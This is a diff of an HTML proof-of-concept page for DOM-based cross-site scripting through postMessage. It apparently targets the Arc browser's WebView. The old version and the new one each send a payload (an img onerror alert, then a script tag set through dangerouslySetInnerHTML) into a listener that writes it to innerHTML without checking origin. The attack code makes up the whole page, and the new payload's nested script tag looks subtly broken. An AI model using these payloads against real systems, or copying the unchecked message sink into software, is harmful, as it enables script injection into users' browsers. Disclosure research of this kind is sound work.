@@ -1,53 +1,57 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>🔥 XSS PoC - thebrowser.company</title>
-    <style>
-      body {
-        font-family: sans-serif;
-        background: #f0f0f0;
-        padding: 30px;
-      }
-      #output {
-        background: white;
-        padding: 20px;
-        border: 2px solid #888;
-        margin-top: 20px;
-      }
-    </style>
-  </head>
-  <body>
-    <h1>✅ DOM XSS PoC via postMessage</h1>
-    <p>Payload will be sent automatically, and injected here:</p>
+<head>
+  <meta charset="utf-8">
+  <title>🔥 Arc WebView XSS PoC – Unified</title>
+  <style>
+    body { background: #111; color: #0f0; font-family: monospace; padding: 1rem; }
+    iframe { width: 100%; height: 300px; border: 2px solid lime; margin-top: 1rem; }
+    button { padding: 0.5rem 1rem; background: lime; border: none; color: #000; font-weight: bold; cursor: pointer; }
+    #log { margin-top: 1rem; color: #ccc; font-size: 0.9rem; white-space: pre-wrap; }
+  </style>
+</head>
+<body>
 
-    <div id="output">[ Waiting for message... ]</div>
+<h2>🚀 Arc WebView XSS PoC (All-in-One)</h2>
+<p>Click the button to send an XSS payload to the simulated WebView below:</p>
+<button onclick="sendXSS()">💥 Send Payload</button>
 
+<iframe id="webview" srcdoc='
+  <!DOCTYPE html>
+  <html>
+  <body style="background:black;color:lime;font-family:monospace;padding:1rem;">
+    <h3>🧪 WebView Simulation Active</h3>
+    <div id="output">[waiting for message...]</div>
     <script>
-      // Step 1: Listen for postMessage
-      window.addEventListener("message", (event) => {
-        if (event.data?.message === "OB_SHOULD_SHOW_PICKER") {
-          const html = event.data.content?.marketerId?.[0];
-          if (html) {
-            console.log("📥 Received marketerId:", html);
-            document.getElementById("output").innerHTML = html;
-          }
+      window.addEventListener("message", (e) => {
+        console.log("📩 Message received:", e.data);
+        if (e.data?.props?.dangerouslySetInnerHTML?.__html) {
+          const html = e.data.props.dangerouslySetInnerHTML.__html;
+          document.getElementById("output").innerHTML = html;
+          console.log("⚠️ Injected into DOM:", html);
         }
       });
-
-      // Step 2: Auto-send payload after 1 second
-      window.onload = () => {
-        setTimeout(() => {
-          console.log("🚀 Sending XSS payload via postMessage...");
-          window.postMessage({
-            message: "OB_SHOULD_SHOW_PICKER",
-            content: {
-              marketerId: [
-                `<img src=x onerror="alert('🔥 XSS Executed in PoC')">`
-              ]
-            }
-          }, "*");
-        }, 1000);
-      };
     </script>
   </body>
+  </html>
+'></iframe>
+
+<div id="log"></div>
+
+<script>
+function sendXSS() {
+  const payload = {
+    props: {
+      dangerouslySetInnerHTML: {
+        __html: `<script>alert('🔥 XSS confirmed')</script>`
+      }
+    }
+  };
+  const iframe = document.getElementById("webview");
+  iframe.contentWindow.postMessage(payload, "*");
+  document.getElementById("log").innerText = "🚀 Payload sent via postMessage:\n" + JSON.stringify(payload, null, 2);
+}
+</script>
+
+</body>
 </html>
